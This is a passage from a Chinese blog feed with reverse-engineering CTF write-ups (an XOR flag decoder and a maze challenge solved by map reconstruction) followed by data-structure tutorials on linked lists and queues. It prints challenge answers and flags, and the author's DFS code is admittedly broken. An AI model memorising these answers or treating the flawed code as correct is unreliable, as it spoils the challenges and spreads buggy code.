class="number">0xEB</span>, <span class="number">0xD3</span>, <span class="number">0x24</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x1A</span>, <span class="number">0x6F</span>, <span class="number">0xD4</span>, <span class="number">0x6A</span>, <span class="number">0xD7</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x8D</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x5A</span>, <span class="number">0x6E</span>, <span class="number">0xBE</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x4B</span> ,<span class="number">0x99</span>,<span class="number">0xd6</span>,<span class="number">0xe6</span>,<span class="number">0x54</span>,<span class="number">0x7A</span>,<span class="number">0x4F</span>,<span class="number">0x50</span>,<span class="number">0x14</span>,<span class="number">0xE5</span>,<span class="number">0xEC</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line"></span><br><span class="line">    flag+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i]^str2[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#flag&#123;c5e0f5f6-f79e-5b9b-988f-28f046117802&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>迷宫题</title>
    <url>/2023/01/08/%E8%BF%B7%E5%AE%AB%E9%A2%98/</url>
    <content><![CDATA[<h1 id="迷宫题"><a href="#迷宫题" class="headerlink" title="迷宫题"></a>迷宫题</h1><p>详细介绍可参考CTF Wiki <a href="https://ctf-wiki.org/reverse/maze/maze/">https://ctf-wiki.org/reverse/maze/maze/</a></p>
<p>我这里进行复现几道题</p>
<h2 id="HUBUCTF-2022-新生赛-help"><a href="#HUBUCTF-2022-新生赛-help" class="headerlink" title="[HUBUCTF 2022 新生赛]help"></a>[HUBUCTF 2022 新生赛]help</h2><p>主逻辑，直接提示是迷宫题</p>
<img src="/2023/01/08/%E8%BF%B7%E5%AE%AB%E9%A2%98/image-20230108173935631.png" class title="This is an image">

<p>关键在于如何自己创建这个地图</p>
<img src="/2023/01/08/%E8%BF%B7%E5%AE%AB%E9%A2%98/image-20230108174507717.png" class title="This is an image">

<p>通过循环可以看出应该是一个16*16的地图</p>
<p>num的数据</p>
<img src="/2023/01/08/%E8%BF%B7%E5%AE%AB%E9%A2%98/image-20230108175928919.png" class title="This is an image">

<p><strong>check</strong>函数</p>
<img src="/2023/01/08/%E8%BF%B7%E5%AE%AB%E9%A2%98/image-20230108205326212.png" class title="This is an image">

<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = [<span class="number">0xFFFF</span>,<span class="number">0x83F7</span>,<span class="number">0xBBF7</span>,<span class="number">0xBB17</span>,<span class="number">0xBB57</span>,<span class="number">0xB857</span>,<span class="number">0xBF57</span>,<span class="number">0xBF17</span>,<span class="number">0xBFB7</span>,<span class="number">0xBFB7</span>,<span class="number">0x8611</span>,<span class="number">0xF7B5</span>,<span class="number">0xF7B5</span>,<span class="number">0x87B4</span>,<span class="number">0xBF87</span>,<span class="number">0xBFFF</span>]</span><br><span class="line"><span class="comment">#长度为16</span></span><br><span class="line"><span class="built_in">map</span> = [-<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]  <span class="comment">#这个代码创建了一个长度为256的列表，并将每个元素都初始化为-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    tmp = num[i]</span><br><span class="line">    j = <span class="number">1</span></span><br><span class="line">    v0 = j</span><br><span class="line">    <span class="keyword">while</span>(v0 <span class="keyword">and</span> j &lt;= <span class="number">16</span>):</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">16</span>*i+<span class="number">16</span>-j] = tmp &amp; <span class="number">1</span></span><br><span class="line">        tmp &gt;&gt;= <span class="number">1</span></span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">        v0 = j</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>, <span class="number">16</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">map</span>[y:y+<span class="number">16</span>])</span><br></pre></td></tr></table></figure>

<p>DFS</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">maze = [[<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]]</span><br><span class="line">usedmap=[[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze))]<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze[<span class="number">0</span>]))]</span><br><span class="line">sti=<span class="number">15</span></span><br><span class="line">stj=<span class="number">1</span></span><br><span class="line">edi=<span class="number">13</span></span><br><span class="line">edj=<span class="number">15</span></span><br><span class="line"></span><br><span class="line">min_path_length=<span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">min_path=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DFS</span>(<span class="params">x,y,path_length,path</span>):</span><br><span class="line">    <span class="keyword">global</span> min_path_length</span><br><span class="line">    <span class="keyword">global</span> min_path</span><br><span class="line">    <span class="keyword">if</span> x==edi <span class="keyword">and</span> y==edj:</span><br><span class="line">        <span class="keyword">if</span> path_length&lt;min_path_length:</span><br><span class="line">            min_path_length=path_length</span><br><span class="line">            min_path=path</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[x+<span class="number">1</span>][y]==<span class="number">0</span> <span class="keyword">and</span> usedmap[x+<span class="number">1</span>][y]==<span class="number">0</span>:</span><br><span class="line">    usedmap[x][y]=<span class="number">1</span></span><br><span class="line">    DFS(x+<span class="number">1</span>,y,path_length+<span class="number">1</span>,path+<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    usedmap[x][y]=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> maze[x - <span class="number">1</span>][y] == <span class="number">0</span> <span class="keyword">and</span> usedmap[x - <span class="number">1</span>][y] == <span class="number">0</span>:</span><br><span class="line">    usedmap[x][y] = <span class="number">1</span></span><br><span class="line">    DFS(x - <span class="number">1</span>, y, path_length + <span class="number">1</span>, path + <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    usedmap[x][y] = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> maze[x][y + <span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> usedmap[x][y + <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">    usedmap[x][y] = <span class="number">1</span></span><br><span class="line">    DFS(x, y + <span class="number">1</span>, path_length + <span class="number">1</span>, path + <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    usedmap[x][y] = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> maze[x][y - <span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> usedmap[x][y - <span class="number">1</span>] == <span class="number">0</span>:</span><br><span class="line">    usedmap[x][y] = <span class="number">1</span></span><br><span class="line">    DFS(x, y - <span class="number">1</span>, path_length + <span class="number">1</span>, path + <span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    usedmap[x][y] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">DFS(sti,stj,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(min_path)</span><br><span class="line"><span class="comment">#但不知道哪里错了，有大佬帮我指出来木，哭了，还是直接手解</span></span><br><span class="line"><span class="comment">#wwdddwwwaaawwwwwwwwwddddssssdddssdsssssssdddwwwwddsssd</span></span><br><span class="line"><span class="comment">#flag:NSSCTF&#123;a8622109e2fb1296e06d5eed6f78f954&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>链表</title>
    <url>/2023/01/23/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><h2 id="什么是链表"><a href="#什么是链表" class="headerlink" title="什么是链表"></a>什么是链表</h2><p>之前我们学习过数组， 数组是在内存中一段连续的存储空间， 可以在常数时间内访问任意位置的元素， 但是数组也有缺点， 无法做到快速的插入和删除， 因为空间是连续且固定的， 想要在 p 位置插入&#x2F;删除一个元素， 则 p 之后的位置的元素都需要移动。</p>
<p>为了能够在常数时间内实现元素的插入和删除， 我们引入 链表 这种数据结构。</p>
<p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。</p>
<p>那么非连续、非线性有什么含义呢？这表明链表的内存是不连续的，前一个元素存储地址的下一个地址中存储的不一定是下一个元素。链表通过一个指向下一个元素地址的引用将链表中的元素串起来。</p>
<h2 id="链表的分类"><a href="#链表的分类" class="headerlink" title="链表的分类"></a>链表的分类</h2><table>
<thead>
<tr>
<th align="left">分类</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">单向链表</td>
<td align="left">每一个节点包含了数据块和指向下一个节点的指针</td>
</tr>
<tr>
<td align="left">双向链表</td>
<td align="left">每一个节点包含了数据块和指向下一个节点的指针以及指向前一个节点的指针</td>
</tr>
</tbody></table>
<h3 id="单向链表"><a href="#单向链表" class="headerlink" title="单向链表"></a>单向链表</h3><p>单向链表是最简单的链表形式。链表中最基本的数据称为节点(node)，每一个节点包含了数据块(data)和指向下一个节点的指针(next)，链表有一个头节点，图中以head表示。可以看出,head指向第一个元素，第一个元素的next又指向第二个元素……直到最后一个元素，该元素不再指向其他元素，它称为表尾，它的 next 为空（ NULL ），链表到此结束</p>
<img src="/2023/01/23/%E9%93%BE%E8%A1%A8/image-20230123170845532.png" class title="This is an image">

<p>可以看到，要找链表中的某一元素，必须先找到上一个元素，根据它提供的下一个元素的地址才能找到下一个元素。如果不提供头指针，则整个链表都无法访问。链表如同一条铁链一样，一环扣一环，中间是不能断开的。</p>
<h2 id="链表的常用操作"><a href="#链表的常用操作" class="headerlink" title="链表的常用操作"></a>链表的常用操作</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查找</td>
<td align="left">找到符合条件的节点</td>
</tr>
<tr>
<td align="left">插入</td>
<td align="left">添加一个新节点</td>
</tr>
<tr>
<td align="left">删除</td>
<td align="left">删除一个存在的节点</td>
</tr>
</tbody></table>
<h3 id="查找操作O-n-（数组的点查是O-1-）"><a href="#查找操作O-n-（数组的点查是O-1-）" class="headerlink" title="查找操作O(n)（数组的点查是O(1)）"></a>查找操作O(n)（数组的点查是O(1)）</h3><p>如何根据给出的数据，找到链表中符合条件的节点？需要从头节点开始，逐个向后遍历节点，比较p的data同待查找的数据是否相同，相同则返回当前节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> next,data;</span><br><span class="line">           &#125;a[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> head;<span class="comment">//head即头节点的编号</span></span><br><span class="line"></span><br><span class="line"><span class="function">node <span class="title">find</span><span class="params">(<span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> p=head;<span class="comment">//从头节点开始遍历</span></span><br><span class="line">    <span class="keyword">while</span>(a[p]!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(value==a[p].data)</span><br><span class="line">            <span class="keyword">return</span> a[p];</span><br><span class="line">        p=a[p].next;<span class="comment">//不满足条件则遍历下一个</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="插入操作O-1"><a href="#插入操作O-1" class="headerlink" title="插入操作O(1)"></a>插入操作O(1)</h3><p>若要在p节点后，插入一个q节点，则需要：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">q-&gt;next=p-&gt;next;</span><br><span class="line">p-&gt;next=q;</span><br></pre></td></tr></table></figure>

<p>链表不能像数组一样直接访问下标，链表只能头遍历，直到走到第p个节点。到达第p个节点后，我们需要先将新节点的next指向当前p节点next指向的节点，再将p节点的next指向这个新的节点</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> next,data;</span><br><span class="line">&#125;a[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> head;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> newIndex,node &amp;pre)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    a[newIndex].next=pre.next;</span><br><span class="line">    pre.next=newIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="删除操作O-1"><a href="#删除操作O-1" class="headerlink" title="删除操作O(1)"></a>删除操作O(1)</h3><p>删除操作与插入操作类似，如果我们想要删除第p个节点，那么我们先要从头遍历到第p-1的节点，将p-1的节点的next指向p的next。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> next,data;</span><br><span class="line">&#125;a[<span class="number">10000</span>];</span><br><span class="line"><span class="type">int</span> head;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete</span><span class="params">(node &amp;delNode,node &amp;pre)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pre.next=delNode.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于链表存储不连续，一般来讲，访问效率低于数组。但链表的删除插入效率高。</p>
<h2 id="链表与数组"><a href="#链表与数组" class="headerlink" title="链表与数组"></a>链表与数组</h2><table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">链表</th>
<th align="left">数组</th>
</tr>
</thead>
<tbody><tr>
<td align="left">查找</td>
<td align="left">从头节点开始查找</td>
<td align="left">从下标 0 开始查找</td>
</tr>
<tr>
<td align="left">插入</td>
<td align="left">很快，因为只需要修改 pre 以及新节点的 next 编号</td>
<td align="left">所有后面的节点都要向后移 1 位</td>
</tr>
<tr>
<td align="left">删除</td>
<td align="left">很快，因为只需要修改 pre 的 next 编号</td>
<td align="left">所有后面的节点都要向前移 1 位</td>
</tr>
</tbody></table>
<h2 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h2><h3 id="队列复原"><a href="#队列复原" class="headerlink" title="队列复原"></a>队列复原</h3><p>小瓜现在让 1 到 n 这 n 个整数排成一列，但是他只告诉你每个整数的后面那个数是什么（最后一个整数的后面那个数是 0 ），请你帮忙复原这个队列。</p>
<h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行一个整数 n （ n≤100000 ），表示有 n 个整数。<br>接下来 n 行，每行两个数 i ， j ，表示排在整数 i 后面的那个数是 j 。</p>
<h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>n 行，每行一个整数，表示完整的队列。</p>
<h4 id="输入样例"><a href="#输入样例" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">1 3</span><br><span class="line">2 4</span><br><span class="line">3 2</span><br><span class="line">4 0</span><br></pre></td></tr></table></figure>

<h4 id="输出样例"><a href="#输出样例" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">4</span><br></pre></td></tr></table></figure>

<p><strong>思路：</strong></p>
<p>用链表记录下每个节点的next，然后从头节点开始，遍历整个链表，并输出值。如何找到头节点？因为是头节点，没有任何节点的next指向头节点。可以开一个bool数组来记录，或者用原来的data来存储每个节点的pre（前一个节点编号），形成一个双向链表，如果某个节点的pre为0，则是头节点。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> next, pre;</span><br><span class="line">&#125; a[<span class="number">10000</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">int</span> i, j;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cin &gt;&gt; i &gt;&gt; j;</span><br><span class="line">		a[i].next = j;</span><br><span class="line">		a[j].pre = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> head;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i].pre == <span class="number">0</span>)</span><br><span class="line">			head = i;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> p = head; p != <span class="number">0</span>; p = a[p].next)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, p);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="队列复原2"><a href="#队列复原2" class="headerlink" title="队列复原2"></a>队列复原2</h3><p>小瓜现在让 1 到 n 这 n 个整数排成一列，但是他只告诉你每个整数的后面那个数是什么（最后一个整数的后面那个数是 0 ）。此外，他还打算在这个队列中插入 m 个整数，他将告诉你这 m 个整数插入的位置。请你帮忙复原插入 m 个整数之后的队列。</p>
<h4 id="输入格式-1"><a href="#输入格式-1" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行两个整数 n （ n≤100000 ）和 m （ m≤100 ），表示有 n 个整数，后续又将插入 m 个整数。<br>接下来 n 行，每行两个数 i ， j ，表示排在整数 i 后面的那个数是 j 。<br>接下来 m 行，每行两个数 a ， b ，表示在下标为 a 的数后面插入编号为 b 的数（保证 n+1≤b≤n+m ）</p>
<h4 id="输出格式-1"><a href="#输出格式-1" class="headerlink" title="输出格式"></a>输出格式</h4><p>n+m 行，表示复原后队列。</p>
<h4 id="输入样例-1"><a href="#输入样例-1" class="headerlink" title="输入样例"></a>输入样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4 2</span><br><span class="line">1 3</span><br><span class="line">3 4</span><br><span class="line">4 2 </span><br><span class="line">2 0</span><br><span class="line">1 5</span><br><span class="line">2 6</span><br></pre></td></tr></table></figure>

<h4 id="输出样例-1"><a href="#输出样例-1" class="headerlink" title="输出样例"></a>输出样例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">5</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">2</span><br><span class="line">6</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">	<span class="type">int</span> next;</span><br><span class="line">&#125;a[<span class="number">100100</span>];</span><br><span class="line"><span class="type">bool</span> h[<span class="number">100200</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, m,head;</span><br><span class="line">	cin &gt;&gt; n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> x,y;</span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">		a[x].next = y;</span><br><span class="line">		h[y] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">int</span> x, y;<span class="comment">//x是原来的节点，y插入在x后面</span></span><br><span class="line">		cin &gt;&gt; x &gt;&gt; y;</span><br><span class="line">		a[y].next = a[x].next;</span><br><span class="line">		a[x].next = y;</span><br><span class="line">		h[y] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n + m; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!h[i])</span><br><span class="line">		&#123;</span><br><span class="line">			head = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = head; i != <span class="number">0</span>; i = a[i].next)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Learn</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>队列</title>
    <url>/2023/01/25/%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h1><h2 id="什么是队列"><a href="#什么是队列" class="headerlink" title="什么是队列"></a>什么是队列</h2><p>队列是一种特殊的线性表。队列的原则是先进先出</p>
<p>队列在队头做删除操作，在队尾做插入操作：</p>
<p>队列的数据元素又称为队列元素。在队列中插入一个队列元素称为入队，从队列中删除一个队列元素称为出队。因为队列只允许在一端插入，在另一端删除，所以只有最早进入队列的元素才能最先从队列中删除，故队列又称为先进先出（FIFO-first in first out）线性表。</p>
<h2 id="写一个队列"><a href="#写一个队列" class="headerlink" title="写一个队列"></a>写一个队列</h2><p>按照队列的基本定义，我们可以自己动手来写一个保存整数的队列。</p>
<p>在动手之前，先来规划需要实现哪些功能，简单总结如下：</p>
<table>
<thead>
<tr>
<th align="left">操作</th>
<th align="left">函数</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">入队</td>
<td align="left">push(x)</td>
<td align="left">将x元素入队</td>
</tr>
<tr>
<td align="left">出队</td>
<td align="left">pop()</td>
<td align="left">弹出队首元素，返回值为队首元素值</td>
</tr>
<tr>
